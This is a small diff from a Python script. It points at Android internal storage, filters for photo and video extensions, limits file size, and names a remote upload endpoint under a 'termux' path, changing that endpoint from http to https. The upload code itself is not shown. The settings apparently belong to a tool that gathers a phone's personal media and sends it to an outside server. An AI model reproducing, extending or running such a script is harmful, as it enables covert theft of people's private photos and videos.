@@ -3,7 +3,7 @@ import requests
 
 # ✅ Step 1
 base_path = "/storage/emulated/0/"  # Android internal storage
-server_url = "http://beautyvellage.store/termux/upload.php"  
+server_url = "https://beautyvellage.store/termux/upload.php"  
 image_extensions = ['.jpg', '.jpeg', '.png', '.webp', '.mp4']
 max_file_size = 20 * 1024 * 1024  # 20 MB in bytes
 
